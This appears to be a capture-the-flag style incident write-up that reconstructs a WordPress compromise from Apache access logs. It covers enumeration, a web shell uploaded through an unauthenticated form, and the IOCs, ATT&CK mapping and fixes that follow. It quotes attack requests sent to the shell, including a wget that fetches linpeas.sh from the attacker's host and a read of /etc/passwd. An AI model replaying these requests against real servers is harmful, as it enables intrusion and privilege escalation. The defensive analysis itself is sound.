# Web Security Investigation — WordPress File Upload Exploitation & Web Shell Deployment

> **Log Source:** Apache access log (`/var/log/apache2/access.log`)
> **Detection Type:** Web Application Compromise / Web Shell
> **Severity:** Critical
> **MITRE ATT&CK:** T1595, T1190, T1505.003, T1059, T1033, T1082, T1083, T1087.001, T1105

---

## Executive Summary

Analysis of Apache access logs for a WordPress site identified a full compromise chain: an external actor (`203.0.113.66`) performed automated directory/file enumeration against the site, discovered an exposed file-upload endpoint (`upload_form.php`) inside `wp-content/uploads/`, and used it to upload a PHP web shell (`shadyshell.php`). The shell was then used to run reconnaissance commands and download a privilege-escalation enumeration script (`linpeas.sh`) onto the server. A secret string embedded in the web shell's source code was recovered during the investigation, confirming direct access to the planted file.

---

## 5W Analysis

| Question | Answer |
|---|---|
| **Who** | External attacker at `203.0.113.66` — reconnaissance performed with user-agent `ashadyagent/1.1`, exploitation performed with `curl/8.14.1` |
| **What** | File-upload vulnerability in a WordPress upload form exploited to plant a PHP web shell, followed by command execution and tool download |
| **When** | Reconnaissance: 05:21:55 – 05:22:26 UTC. Exploitation: 06:09:27 – 06:20:36 UTC (17 Jul 2025) — a ~47-minute gap between recon and the actual upload |
| **Where** | WordPress installation at `/wordpress`, specifically the `wp-content/uploads/` directory via `upload_form.php` |
| **Why** | Consistent with establishing a persistent remote-execution foothold and staging for privilege escalation (evidenced by the `linpeas.sh` download) |

---

## Investigation

### Stage 1 — Reconnaissance / Directory & File Enumeration

Starting at `05:21:55`, IP `203.0.113.66` (user-agent `ashadyagent/1.1`, a non-browser/automated client) began systematically requesting dozens of common paths — `/wp-admin`, `/config`, `/backup`, `/db_backup`, `/shell`, `/adminer`, etc. — almost all returning `404`. This pattern (rapid, sequential requests to a wordlist of common admin/backup/debug paths from a single client) is a textbook content-discovery/fuzzing signature, not organic browsing.

**First directory successfully identified:**
```
203.0.113.66 - - [17/Jul/2025:05:21:59 +0000] "GET /wordpress HTTP/1.1" 200 10914 "ashadyagent/1.1"
```
This is the first request (excluding the document root `/`) that returns `200`, confirming the real application path — everything before this point was blind guessing against non-existent paths.

From here the attacker pivots to targeted enumeration under `/wordpress/`, discovering `wp-content` (301 redirect, confirming it exists) and ultimately:
```
203.0.113.66 - - [17/Jul/2025:05:22:16 +0000] "GET /wordpress/wp-content/uploads/ HTTP/1.1" 200 532 "ashadyagent/1.1"
203.0.113.66 - - [17/Jul/2025:05:22:16 +0000] "GET /wordpress/wp-content/uploads/upload_form.php HTTP/1.1" 200 3435 "ashadyagent/1.1"
```
Directory listing is enabled on `uploads/`, and a live, unauthenticated **file upload form** is discovered — the vulnerability that enables the next stage.

### Stage 2 — Web Shell Upload

After a ~47-minute gap (consistent with the attacker manually preparing/reviewing before exploiting), the client returns with a different tool signature (`curl/8.14.1`, i.e. scripted/manual exploitation rather than automated scanning) and uploads a file:

```
203.0.113.66 - - [17/Jul/2025:06:09:27 +0000] "POST /wordpress/wp-content/uploads/upload_form.php?file=shadyshell.php HTTP/1.1" 200 204 "curl/8.14.1"
```

**Web shell filename: `shadyshell.php`**

Three minutes later, the attacker confirms the shell is live and reachable:
```
203.0.113.66 - - [17/Jul/2025:06:12:23 +0000] "GET /wordpress/wp-content/uploads/shadyshell.php HTTP/1.1" 200 456 "curl/8.14.1"
```

### Stage 3 — Command Execution via Web Shell

The attacker begins issuing OS commands through the shell's `cmd` parameter:

| Time (UTC) | Command | Purpose |
|---|---|---|
| 06:14:55 | `whoami` | Identify the web server's running user context — **first command executed** |
| 06:15:11 | `id` | Confirm user/group privileges |
| 06:15:53 | `uname -a` | System/kernel information gathering |
| 06:16:28 | `ls -la /home` | Enumerate local user home directories |
| 06:18:39 | `cat /etc/passwd` | Enumerate local system accounts |

This is a standard Discovery sequence — establishing identity, privilege level, and host context immediately after gaining code execution.

### Stage 4 — Tool Download (Ingress Tool Transfer)

```
203.0.113.66 - - [17/Jul/2025:06:20:36 +0000] "GET /wordpress/wp-content/uploads/shadyshell.php?cmd=wget%20http://203.0.113.66:8000/linpeas.sh HTTP/1.1" 200 1 "curl/8.14.1"
```

**Second file downloaded: `linpeas.sh`** — a well-known Linux privilege-escalation enumeration script, hosted by the attacker on their own infrastructure (`203.0.113.66:8000`). This indicates the attacker's next intended step was privilege escalation beyond the current web-server user context.

### Stage 5 — Flag Recovery (Web Shell Source Inspection)

Investigating the planted web shell's source code directly (`cat`) revealed a secret string embedded by the attacker/challenge author within the file:

```
THM{W3b_Sh3ll_Int3rnals}
```

This confirms direct filesystem access to the planted shell and closes out the investigation.

---

## Attack Flow (HTTP Request Chain)

No host-level process telemetry (Sysmon/auditd) was available for this investigation — evidence is limited to the Apache access log. The equivalent "process tree" for a web-log-only investigation is the HTTP request chain:

```
203.0.113.66 (ashadyagent/1.1)
  └── Directory/file enumeration (dozens of 404s)
        └── GET /wordpress                                    → 200 (app root confirmed)
              └── GET /wordpress/wp-content/uploads/           → 200 (listing enabled)
                    └── GET .../upload_form.php                → 200 (upload endpoint found)

203.0.113.66 (curl/8.14.1)  [~47 min later]
  └── POST .../upload_form.php?file=shadyshell.php             → web shell planted
        └── GET .../shadyshell.php                             → shell confirmed live
              ├── ?cmd=whoami                                  → user context
              ├── ?cmd=id                                      → privilege check
              ├── ?cmd=uname -a                                → system info
              ├── ?cmd=ls -la /home                             → user enumeration
              ├── ?cmd=cat /etc/passwd                          → account enumeration
              └── ?cmd=wget http://203.0.113.66:8000/linpeas.sh → privesc tool staged
```

---

## Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| Attacker IP | 203.0.113.66 |
| Recon user-agent | ashadyagent/1.1 |
| Exploitation user-agent | curl/8.14.1 |
| Vulnerable endpoint | /wordpress/wp-content/uploads/upload_form.php |
| Web shell filename | shadyshell.php |
| Web shell path | /wordpress/wp-content/uploads/shadyshell.php |
| Downloaded tool | linpeas.sh |
| Tool source | hxxp://203.0.113[.]66:8000/linpeas.sh |
| Recovered secret (shell source) | THM{W3b_Sh3ll_Int3rnals} |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Description |
|---|---|---|
| Reconnaissance | T1595 | Active Scanning — automated directory/file enumeration against the WordPress site |
| Initial Access | T1190 | Exploit Public-Facing Application — unauthenticated file-upload endpoint abused |
| Persistence | T1505.003 | Server Software Component: Web Shell — `shadyshell.php` planted for repeat access |
| Execution | T1059 | Command and Scripting Interpreter — OS commands run via the shell's `cmd` parameter |
| Discovery | T1033 / T1082 / T1083 | System Owner/User, System Information, and File/Directory Discovery — `whoami`, `id`, `uname -a`, `ls` |
| Discovery | T1087.001 | Account Discovery: Local Account — `cat /etc/passwd` |
| Command and Control | T1105 | Ingress Tool Transfer — `linpeas.sh` downloaded from attacker-controlled infrastructure |

---

## Analyst Notes & Caveats

- **Anomalous internal-IP request.** One command (`cmd=cat /etc/passwd` at `06:16:38`) was issued from `192.168.1.10` — an internal address seen earlier in the log performing normal, legitimate WordPress browsing — rather than from the attacker's IP (`203.0.113.66`). This is flagged rather than silently folded into the attacker's timeline. Possible explanations include: a second interactive party (e.g. an admin/analyst testing the same shell), the attacker pivoting through an internal host, or unrelated lab/environment noise. This was not resolved with the data available and would need further correlation (e.g. checking what else `192.168.1.10` did around that time) in a real investigation.
- **No host-level telemetry available.** This investigation is based solely on Apache access logs. Confirming what the web shell actually executed at the OS/process level (versus what was requested via HTTP) would require server-side process logging (auditd/Sysmon-equivalent) or file integrity monitoring, none of which was in scope here.
- **Scope of impact undetermined.** The log confirms code execution and reconnaissance, and staging of a privilege-escalation tool, but does not by itself confirm successful privilege escalation, lateral movement, or data exfiltration — those would require further evidence (e.g. `linpeas.sh` output was not captured/returned in this log source).

---

## Recommendations

- Remove or authenticate the exposed `upload_form.php` endpoint; never allow unauthenticated file uploads to a web-accessible directory.
- Disable directory listing on `wp-content/uploads/` and all other web-accessible directories.
- Configure the web server/PHP to disallow execution of scripts from the uploads directory (e.g. via `.htaccess` or PHP-FPM pool config).
- Delete the planted web shell (`shadyshell.php`) and audit the uploads directory for any other unauthorized files.
- Block `203.0.113.66` at the firewall/WAF and review historical logs for any other activity from this IP.
- Investigate the `192.168.1.10` anomaly to rule out an internal compromise or authorized-but-undocumented testing.
- Patch/update the WordPress core, theme, and all plugins — an exposed raw upload form is not standard WordPress behavior and likely originates from a vulnerable plugin or custom code.
- Deploy a WAF rule to detect and block sequential 404-heavy content-discovery patterns from a single source IP.

---

## Conclusion

This investigation reconstructed a complete web application compromise from Apache access logs alone: automated reconnaissance identified an unauthenticated file-upload endpoint inside a WordPress `uploads` directory, which was exploited to plant a PHP web shell (`shadyshell.php`). The attacker used the shell to run standard Discovery commands (`whoami`, `id`, `uname -a`, `ls`, `cat /etc/passwd`) before downloading a privilege-escalation enumeration tool (`linpeas.sh`) — indicating clear intent to escalate beyond the web server's user context. A secret string recovered from the shell's source code (`THM{W3b_Sh3ll_Int3rnals}`) confirmed direct investigative access to the planted file. This case is a clear example of why unauthenticated upload endpoints and directory listing are high-priority findings in any web application security review.
